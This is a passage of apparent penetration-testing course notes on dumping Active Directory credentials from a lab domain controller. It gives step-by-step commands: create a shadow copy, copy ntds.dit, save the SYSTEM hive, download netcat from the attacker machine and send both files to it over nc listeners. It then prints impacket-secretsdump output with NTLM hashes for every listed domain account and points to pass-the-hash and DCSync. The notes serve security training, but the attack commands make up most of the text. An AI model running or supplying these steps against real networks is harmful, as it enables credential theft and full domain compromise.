	
	List of created shadow copies:
	
	Querying all shadow copies with the SnapshotSetID {523569da-46ad-42da-a45f-2bc4973bb890} ...
	
	* SNAPSHOT ID = {8036aa87-9851-4106-aab1-eb64c8fef7c9} ...
	   - Shadow copy Set: {523569da-46ad-42da-a45f-2bc4973bb890}
	   - Original count of shadow copies = 1
	   - Original Volume name: \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\]
	   - Creation Time: 9/2/2024 11:14:36 AM
	   - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2                 # --> NOTE DOWN
	   - Originating machine: DC1.corp.com
	   - Service machine: DC1.corp.com
	   - Not Exposed
	   - Provider id: {b5946137-7b9f-4925-af80-51abd60b20d5}
	   - Attributes:  No_Auto_Release Persistent No_Writers Differential
	
	Snapshot creation done.
```
	- -nw - Disable writers.  Speeds up process
	- -p - Save copy to disk
	- Take note of `Shadow copy device name`

- Copy whole AD db from the shadow copy to the C: root
```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
	1 file(s) copied.
```

- Save the SYSTEM hive from the reg
```powershell
reg.exe save hklm\system c:\system.bak
	The operation completed successfully.
```

- Transfer the two files to kali w/ nc
```powershell
# Setup python web server on kali in folder w/ nc.exe
python3 -m http.server 80

# Switch to PS prompt and download nc.exe
powershell
iwr -uri http://192.168.228.45/nc.exe -Outfile nc.exe

# In kali, setup multiple nc listeners to catch the files
nc -nlvp 5555 > system.bak
nc -nlvp 4444 > ntds.dit.bak

# In Win, exit powershell and send files
exit
.\nc.exe 192.168.228.45 5555 < system.bak
.\nc.exe 192.168.228.45 4444 < ntds.dit.bak
```
	- We exit PS for the use of nc.exe as `<` produces an error otherwise
	- Not sure if process will work smoothly if transferring both at the same time.   Always safer to transfer files individually.

- Extract creds w/ *secretsdump* from **impacket**
```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
	Impacket v0.12.0.dev1 - Copyright 2023 Fortra
	
	[*] Target system bootKey: 0xbbe6040ef887565e9adb216561dc0620
	[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
	[*] Searching for pekList, be patient
	[*] PEK # 0 found and decrypted: 98d2b28135d3e0d113c4fa9d965ac533
	[*] Reading and decrypting hashes from ntds.dit.bak 
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	DC1$:1000:aad3b435b51404eeaad3b435b51404ee:eb9131bbcdafe388b4ed8a511493dfc6:::
	krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
	dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
	stephanie:1104:aad3b435b51404eeaad3b435b51404ee:d2b35e8ac9d8f4ad5200acc4e0fd44fa:::
	jeff:1105:aad3b435b51404eeaad3b435b51404ee:2688c6d2af5e9c7ddb268899123744ea:::
	jeffadmin:1106:aad3b435b51404eeaad3b435b51404ee:e460605a9dbd55097c6cf77af2f89a03:::
	iis_service:1109:aad3b435b51404eeaad3b435b51404ee:4d28cf5252d39971419580a51484ca09:::
	WEB04$:1112:aad3b435b51404eeaad3b435b51404ee:6ce7a763842704c39101fea70b77a6bc:::
	FILES04$:1118:aad3b435b51404eeaad3b435b51404ee:024e0b5bc4f09a8f909813e2c5041a2c:::
	...
	[*] Cleaning up...
```

Can now either try to crack the hashes or use them as-is in PtH attacks

>While these methods might work fine, they leave an access trail and may require us to upload tools. An alternative is to abuse AD functionality itself to capture hashes remotely from a workstation.
>
To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user, using the DC sync method described in the previous Module. This is a less conspicuous persistence technique that we can misuse.